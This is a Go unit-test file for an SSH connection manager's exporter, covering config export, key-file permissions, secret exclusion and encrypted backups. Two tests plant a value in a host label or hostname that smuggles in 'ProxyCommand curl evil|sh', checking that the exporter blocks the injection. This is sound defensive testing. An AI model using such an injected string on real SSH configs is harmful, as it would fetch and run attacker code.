package exporter

import (
	"bytes"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"vvterm/internal/domain"
	"vvterm/internal/importer"
	"vvterm/internal/vault"
)

func sampleData() domain.Data {
	g := domain.Group{Meta: domain.Meta{ID: "g1"}, Name: "acme-prod"}
	ident := domain.Identity{Meta: domain.Meta{ID: "i1aaaaaaaa"}, Name: "deploy key", AuthType: domain.AuthKey, SecretRef: "s1"}
	pwid := domain.Identity{Meta: domain.Meta{ID: "i2bbbbbbbb"}, Name: "pw", AuthType: domain.AuthPassword, SecretRef: "s2"}
	return domain.Data{
		Groups:     []domain.Group{g},
		Identities: []domain.Identity{ident, pwid},
		Hosts: []domain.Host{
			{Meta: domain.Meta{ID: "h1"}, Label: "bastion", Hostname: "b.example.com", Port: 22, Username: "ops", GroupID: "g1", IdentityID: "i1aaaaaaaa", Env: domain.EnvProd, Tags: []string{"edge", "ssh"}, KeepaliveSec: 30},
			{Meta: domain.Meta{ID: "h2"}, Label: "db 1", Hostname: "10.0.0.5", Port: 2222, Username: "dba", GroupID: "g1", JumpHostID: "h1", IdentityID: "i2bbbbbbbb", KeepaliveSec: 30},
			{Meta: domain.Meta{ID: "h3"}, Label: "loose", Hostname: "loose.example.com", Port: 22, KeepaliveSec: 30},
		},
		Forwards: []domain.PortForward{
			{Meta: domain.Meta{ID: "f1"}, HostID: "h2", Type: domain.ForwardLocal, BindAddr: "127.0.0.1", BindPort: 3306, DestHost: "127.0.0.1", DestPort: 3306},
			{Meta: domain.Meta{ID: "f2"}, HostID: "h2", Type: domain.ForwardDynamic, BindAddr: "127.0.0.1", BindPort: 1080},
		},
	}
}

func TestSSHConfigRoundTripThroughImporter(t *testing.T) {
	dir := t.TempDir()
	rep, err := SSHConfig(dir, sampleData(), false, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.Files) != 2 || len(rep.KeyFiles) != 0 {
		t.Fatalf("report: %+v", rep)
	}
	parsed, err := importer.ParseFile(filepath.Join(dir, "config"))
	if err != nil {
		t.Fatal(err)
	}
	plan := importer.Build(parsed, domain.Data{}, importer.PolicySkip)
	if len(plan.Hosts) != 3 || len(plan.Forwards) != 2 || len(plan.Groups) != 1 || plan.Groups[0].Name != "acme-prod" {
		t.Fatalf("round trip lost data: hosts=%d fwd=%d groups=%+v", len(plan.Hosts), len(plan.Forwards), plan.Groups)
	}
	by := map[string]domain.Host{}
	id := map[string]domain.Host{}
	for _, h := range plan.Hosts {
		by[h.Label] = h
		id[h.ID] = h
	}
	b := by["bastion"]
	if b.Env != domain.EnvProd || len(b.Tags) != 2 || b.Username != "ops" || b.GroupID == "" {
		t.Fatalf("bastion: %+v", b)
	}
	d := by["db-1"] // label sanitised
	if d.Port != 2222 || id[d.JumpHostID].Label != "bastion" || d.Username != "dba" {
		t.Fatalf("db: %+v", d)
	}
	if by["loose"].GroupID != "" {
		t.Fatal("ungrouped host gained a group")
	}
}

func TestSSHConfigKeysOnlyWhenRequestedWith0600(t *testing.T) {
	d := sampleData()
	pem := []byte("-----BEGIN KEY-----\nxxx\n-----END KEY-----\n")
	calls := 0
	kp := func(id string) ([]byte, error) { calls++; return pem, nil }

	dir := t.TempDir()
	if _, err := SSHConfig(dir, d, false, kp); err != nil {
		t.Fatal(err)
	}
	if calls != 0 {
		t.Fatal("key provider called although keys were not requested")
	}
	if _, err := os.Stat(filepath.Join(dir, "keys")); err == nil {
		t.Fatal("keys dir created without opt-in")
	}
	cfg, _ := os.ReadFile(filepath.Join(dir, "config.d", "acme-prod"))
	if strings.Contains(string(cfg), "IdentityFile") || !strings.Contains(string(cfg), "not exported") {
		t.Fatalf("config should explain missing key:\n%s", cfg)
	}

	dir2 := t.TempDir()
	rep, err := SSHConfig(dir2, d, true, kp)
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.KeyFiles) != 1 {
		t.Fatalf("key files: %v", rep.KeyFiles)
	}
	st, _ := os.Stat(rep.KeyFiles[0])
	if st.Mode().Perm() != 0o600 {
		t.Fatalf("key perm %v", st.Mode().Perm())
	}
	cfg2, _ := os.ReadFile(filepath.Join(dir2, "config.d", "acme-prod"))
	if !strings.Contains(string(cfg2), "IdentityFile "+rep.KeyFiles[0]) {
		t.Fatalf("IdentityFile missing:\n%s", cfg2)
	}
	if !strings.Contains(string(cfg2), "password identity") {
		t.Fatal("password identity should be noted, not exported")
	}
}

func TestSSHConfigKeyErrorBecomesWarning(t *testing.T) {
	rep, err := SSHConfig(t.TempDir(), sampleData(), true, func(string) ([]byte, error) { return nil, errors.New("vault locked") })
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.Warnings) == 0 || len(rep.KeyFiles) != 0 {
		t.Fatalf("%+v", rep)
	}
}

func TestSSHConfigSkipsDeletedAndDedupesAliases(t *testing.T) {
	d := sampleData()
	now := d.Hosts[0].UpdatedAt
	_ = now
	d.Hosts = append(d.Hosts, domain.Host{Meta: domain.Meta{ID: "h4"}, Label: "loose", Hostname: "other", Port: 22})
	del := d.Hosts[2]
	del.ID = "h5"
	del.Label = "gone"
	t0 := del.UpdatedAt
	del.DeletedAt = &t0
	d.Hosts = append(d.Hosts, del)
	dir := t.TempDir()
	if _, err := SSHConfig(dir, d, false, nil); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(filepath.Join(dir, "config"))
	s := string(b)
	if strings.Contains(s, "gone") {
		t.Fatal("tombstoned host exported")
	}
	if !strings.Contains(s, "Host loose\n") || !strings.Contains(s, "Host loose-2\n") {
		t.Fatalf("aliases not deduped:\n%s", s)
	}
}

func TestSSHConfigHostileLabelCannotInjectDirectives(t *testing.T) {
	d := domain.Data{Hosts: []domain.Host{{Meta: domain.Meta{ID: "h"}, Label: "x\n    ProxyCommand curl evil|sh", Hostname: "h", Port: 22}}}
	dir := t.TempDir()
	if _, err := SSHConfig(dir, d, false, nil); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(filepath.Join(dir, "config"))
	if strings.Contains(string(b), "ProxyCommand") && strings.Contains(string(b), "\n    ProxyCommand") {
		t.Fatalf("injected directive:\n%s", b)
	}
}

func TestPlainJSONHasNoSecretsOrTombstones(t *testing.T) {
	d := sampleData()
	t0 := d.Hosts[2].UpdatedAt
	d.Hosts[2].DeletedAt = &t0
	b, err := PlainJSON(d)
	if err != nil {
		t.Fatal(err)
	}
	s := string(b)
	if strings.Contains(s, "secret_ref\": \"s1") || strings.Contains(s, "loose.example.com") {
		t.Fatalf("leak:\n%s", s)
	}
	var back domain.Data
	if err := json.Unmarshal(b, &back); err != nil || len(back.Hosts) != 2 {
		t.Fatalf("%v %+v", err, back.Hosts)
	}
}

func TestBackupRoundTrip(t *testing.T) {
	d := sampleData()
	secrets := []vault.PlainSecret{{ID: "s1", Kind: domain.SecretPrivateKey, Value: []byte("PRIVATE-KEY-BYTES")}}
	if _, err := EncryptBackup("short", d, secrets); err == nil {
		t.Fatal("short backup password accepted")
	}
	blob, err := EncryptBackup("backup-password", d, secrets)
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Contains(blob, []byte("PRIVATE-KEY-BYTES")) || bytes.Contains(blob, []byte("b.example.com")) {
		t.Fatal("backup is not encrypted")
	}
	if _, err := DecryptBackup("wrong-password", blob); !errors.Is(err, vault.ErrBadPassword) {
		t.Fatalf("got %v", err)
	}
	got, err := DecryptBackup("backup-password", blob)
	if err != nil {
		t.Fatal(err)
	}
	if len(got.Data.Hosts) != 3 || string(got.Secrets[0].Value) != "PRIVATE-KEY-BYTES" || got.Secrets[0].ID != "s1" {
		t.Fatalf("%+v", got)
	}
}

func TestSSHConfigSkipsHostWithInjectedHostname(t *testing.T) {
	d := domain.Data{Hosts: []domain.Host{
		{Meta: domain.Meta{ID: "h"}, Label: "evil", Hostname: "h\n    ProxyCommand curl evil|sh", Port: 22},
		{Meta: domain.Meta{ID: "g"}, Label: "good", Hostname: "g", Port: 22},
	}}
	dir := t.TempDir()
	rep, err := SSHConfig(dir, d, false, nil)
	if err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(filepath.Join(dir, "config"))
	if strings.Contains(string(b), "ProxyCommand") || !strings.Contains(string(b), "Host good") || len(rep.Warnings) != 1 {
		t.Fatalf("warnings=%v\n%s", rep.Warnings, b)
	}
}
